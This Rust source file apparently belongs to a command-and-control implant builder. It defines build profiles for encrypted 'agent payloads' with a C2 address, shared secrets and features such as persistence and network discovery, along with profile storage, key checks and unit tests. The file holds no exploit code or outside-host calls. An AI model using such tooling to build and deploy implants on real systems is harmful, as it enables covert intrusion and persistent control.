//! Configuration profiles for the Orchestra Builder.
//!
//! A `PayloadConfig` describes everything the builder needs to know to produce
//! a single agent payload: where it should run, what features it should ship
//! with, and which AES-256 key should encrypt the resulting binary. Profiles
//! are persisted to `profiles/<name>.toml` so that operators can keep a small
//! library of reproducible build recipes (one per deployment target).

use anyhow::{anyhow, Context, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// Directory (relative to the workspace root) where profiles live.
pub const PROFILES_DIR: &str = "profiles";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadConfig {
    /// `"linux"`, `"windows"`, or `"macos"`.
    pub target_os: String,
    /// `"x86_64"` or `"aarch64"`.
    pub target_arch: String,
    /// Address of the Control Center / management endpoint, e.g. `"10.0.0.5:8444"`.
    pub c2_address: String,
    /// Either a base64-encoded 32-byte AES key, or `file:/path/to/key.bin`
    /// (the file is read at build time). Used to encrypt the payload binary.
    pub encryption_key: String,
    /// Pre-shared secret the agent uses for its AES-TCP connection to the
    /// Control Center. Must match `agent_shared_secret` in `orchestra-server.toml`.
    /// Required when `outbound-c` is in `features`. If absent the agent will
    /// look for the `ORCHESTRA_SECRET` runtime environment variable.
    #[serde(default)]
    pub c_server_secret: Option<String>,
    /// Cargo feature flags to enable on the agent crate.
    #[serde(default)]
    pub features: Vec<String>,
    /// Optional override for the encrypted output filename (without
    /// extension). Defaults to the profile name.
    #[serde(default)]
    pub output_name: Option<String>,
    /// Cargo package to build as the payload. Defaults to `launcher`.
    #[serde(default = "default_package")]
    pub package: String,
    /// Name of the binary target within `package`. Defaults to `package`.
    /// Set to `"agent-standalone"` when building with `outbound-c`.
    #[serde(default)]
    pub bin_name: Option<String>,
}

fn default_package() -> String {
    "launcher".to_string()
}

impl PayloadConfig {
    /// Cargo target triple derived from `target_os` and `target_arch`.
    pub fn target_triple(&self) -> Result<String> {
        let triple = match (self.target_os.as_str(), self.target_arch.as_str()) {
            ("linux", "x86_64") => "x86_64-unknown-linux-gnu",
            ("linux", "aarch64") => "aarch64-unknown-linux-gnu",
            ("windows", "x86_64") => "x86_64-pc-windows-gnu",
            ("windows", "aarch64") => "aarch64-pc-windows-msvc",
            ("macos", "x86_64") => "x86_64-apple-darwin",
            ("macos", "aarch64") => "aarch64-apple-darwin",
            (os, arch) => return Err(anyhow!("Unsupported target combination: {os}/{arch}")),
        };
        Ok(triple.to_string())
    }

    /// Resolve the encryption key into raw 32 bytes.
    ///
    /// Logs a warning if the key is trivially weak (all-identical bytes or
    /// sequential bytes — patterns that indicate a placeholder or zero-filled
    /// key rather than cryptographically random material).
    pub fn resolve_key(&self) -> Result<Vec<u8>> {
        use base64::Engine;

        let raw = if let Some(path) = self.encryption_key.strip_prefix("file:") {
            std::fs::read(path).with_context(|| format!("Failed to read key file {path}"))?
        } else {
            base64::engine::general_purpose::STANDARD
                .decode(self.encryption_key.trim())
                .context("encryption_key is not valid base64 (or `file:<path>`)")?
        };

        if raw.len() != 32 {
            return Err(anyhow!(
                "AES-256 key must be exactly 32 bytes (got {})",
                raw.len()
            ));
        }

        if is_weak_key(&raw) {
            tracing::warn!(
                "The configured encryption_key appears to be a weak placeholder \
                 (all-zero or all-identical bytes). Generate a random key with \
                 `orchestra-builder configure` before deploying."
            );
        }

        Ok(raw)
    }
}

/// Return `true` if `key` looks like a placeholder rather than random material:
/// all bytes are identical, or every byte equals the previous + 1 (sequential).
pub fn is_weak_key(key: &[u8]) -> bool {
    if key.is_empty() {
        return true;
    }
    let all_same = key.iter().all(|&b| b == key[0]);
    let sequential = key.windows(2).all(|w| w[1] == w[0].wrapping_add(1));
    all_same || sequential
}

/// Path to the profile file for a given name.
pub fn profile_path(name: &str) -> PathBuf {
    Path::new(PROFILES_DIR).join(format!("{name}.toml"))
}

/// Load a profile by name (no `.toml` suffix) or by direct path.
pub fn load_profile(name_or_path: &str) -> Result<PayloadConfig> {
    let path = if Path::new(name_or_path).is_file() {
        PathBuf::from(name_or_path)
    } else {
        profile_path(name_or_path)
    };
    let text = std::fs::read_to_string(&path)
        .with_context(|| format!("Failed to read profile {}", path.display()))?;
    let cfg: PayloadConfig =
        toml::from_str(&text).with_context(|| format!("Invalid TOML in {}", path.display()))?;
    Ok(cfg)
}

/// Persist a profile to `profiles/<name>.toml`.
pub fn save_profile(name: &str, cfg: &PayloadConfig) -> Result<PathBuf> {
    std::fs::create_dir_all(PROFILES_DIR)
        .with_context(|| format!("Failed to create {PROFILES_DIR}/"))?;
    let path = profile_path(name);
    let text = toml::to_string_pretty(cfg).context("Failed to serialize profile")?;
    std::fs::write(&path, text).with_context(|| format!("Failed to write {}", path.display()))?;
    Ok(path)
}

/// List every `*.toml` file in `profiles/`.
pub fn list_profiles() -> Result<Vec<String>> {
    let dir = Path::new(PROFILES_DIR);
    if !dir.exists() {
        return Ok(Vec::new());
    }
    let mut names = Vec::new();
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.extension().and_then(|s| s.to_str()) == Some("toml") {
            if let Some(stem) = path.file_stem().and_then(|s| s.to_str()) {
                names.push(stem.to_string());
            }
        }
    }
    names.sort();
    Ok(names)
}

/// Path to the agent crate's `Cargo.toml`, relative to the workspace root.
pub const AGENT_CARGO_TOML: &str = "agent/Cargo.toml";

/// Return the list of `[features]` declared in `agent/Cargo.toml`, sorted.
///
/// The Builder reads this at runtime so its interactive wizard can only
/// offer feature flags that the agent crate actually understands. If the
/// file is missing or malformed we fall back to an empty list and the
/// caller surfaces a helpful error.
pub fn read_agent_features() -> Result<Vec<String>> {
    read_agent_features_from(Path::new(AGENT_CARGO_TOML))
}

pub fn read_agent_features_from(path: &Path) -> Result<Vec<String>> {
    let text = std::fs::read_to_string(path)
        .with_context(|| format!("Failed to read {}", path.display()))?;
    let parsed: toml::Value =
        toml::from_str(&text).with_context(|| format!("Invalid TOML in {}", path.display()))?;
    let mut feats: Vec<String> = parsed
        .get("features")
        .and_then(|v| v.as_table())
        .map(|t| t.keys().filter(|k| *k != "default").cloned().collect())
        .unwrap_or_default();
    feats.sort();
    Ok(feats)
}

/// Split `requested` into (known, unknown) buckets against `available`.
/// Used by the build pipeline to drop features that no longer exist in the
/// agent crate (e.g. profiles saved by an older Builder version).
pub fn partition_features(
    requested: &[String],
    available: &[String],
) -> (Vec<String>, Vec<String>) {
    let mut known = Vec::new();
    let mut unknown = Vec::new();
    for f in requested {
        if available.iter().any(|a| a == f) {
            known.push(f.clone());
        } else {
            unknown.push(f.clone());
        }
    }
    (known, unknown)
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine as _;

    #[test]
    fn round_trip_profile() {
        let cfg = PayloadConfig {
            target_os: "linux".into(),
            target_arch: "x86_64".into(),
            c2_address: "127.0.0.1:8444".into(),
            encryption_key: base64::engine::general_purpose::STANDARD.encode([0u8; 32]),
            c_server_secret: Some("my-secret".into()),
            features: vec!["persistence".into()],
            output_name: None,
            package: "launcher".into(),
            bin_name: None,
        };
        let text = toml::to_string_pretty(&cfg).unwrap();
        let parsed: PayloadConfig = toml::from_str(&text).unwrap();
        assert_eq!(parsed.target_triple().unwrap(), "x86_64-unknown-linux-gnu");
        assert_eq!(parsed.resolve_key().unwrap().len(), 32);
    }

    #[test]
    fn rejects_short_key() {
        let cfg = PayloadConfig {
            target_os: "linux".into(),
            target_arch: "x86_64".into(),
            c2_address: "x".into(),
            encryption_key: base64::engine::general_purpose::STANDARD.encode([0u8; 16]),
            c_server_secret: None,
            features: vec![],
            output_name: None,
            package: "launcher".into(),
            bin_name: None,
        };
        assert!(cfg.resolve_key().is_err());
    }

    #[test]
    fn rejects_unknown_triple() {
        let cfg = PayloadConfig {
            target_os: "plan9".into(),
            target_arch: "x86_64".into(),
            c2_address: String::new(),
            encryption_key: base64::engine::general_purpose::STANDARD.encode([0u8; 32]),
            c_server_secret: None,
            features: vec![],
            output_name: None,
            package: "launcher".into(),
            bin_name: None,
        };
        assert!(cfg.target_triple().is_err());
    }

    #[test]
    fn is_weak_key_detects_all_zeros() {
        assert!(is_weak_key(&[0u8; 32]));
    }

    #[test]
    fn is_weak_key_detects_all_same_nonzero() {
        assert!(is_weak_key(&[0xffu8; 32]));
    }

    #[test]
    fn is_weak_key_detects_sequential() {
        let key: Vec<u8> = (0u8..32).collect();
        assert!(is_weak_key(&key));
    }

    #[test]
    fn is_weak_key_accepts_random_looking_bytes() {
        // A non-degenerate key should not be flagged.
        let key = [
            0x9b, 0x4e, 0xa1, 0x3c, 0x77, 0x02, 0xf8, 0x5d, 0x1a, 0xce, 0x43, 0xb6, 0x8f, 0x20,
            0x7e, 0xd9, 0x52, 0x0b, 0xc4, 0x67, 0x3a, 0xfe, 0x91, 0x28, 0xe5, 0x74, 0x19, 0xad,
            0x60, 0x35, 0x8c, 0xf0,
        ];
        assert!(!is_weak_key(&key));
    }

    #[test]
    fn read_agent_features_matches_real_cargo_toml() {
        // The wizard's offered features must come straight from the agent
        // crate; this test pins the contract so adding/removing a feature
        // in agent/Cargo.toml is reflected immediately.
        let path = std::path::PathBuf::from("..").join(AGENT_CARGO_TOML);
        let feats = read_agent_features_from(&path).expect("agent/Cargo.toml parsed");
        assert!(
            !feats.is_empty(),
            "agent crate should declare at least one feature"
        );
        // Known stable features.
        for required in ["persistence", "network-discovery", "outbound-c"] {
            assert!(
                feats.iter().any(|f| f == required),
                "expected feature `{required}` in agent/Cargo.toml, got {feats:?}"
            );
        }
    }

    #[test]
    fn partition_features_splits_known_and_unknown() {
        let available = vec!["persistence".to_string(), "outbound-c".to_string()];
        let requested = vec![
            "persistence".to_string(),
            "this-was-removed".to_string(),
            "outbound-c".to_string(),
        ];
        let (known, unknown) = partition_features(&requested, &available);
        assert_eq!(known, vec!["persistence", "outbound-c"]);
        assert_eq!(unknown, vec!["this-was-removed"]);
    }
}
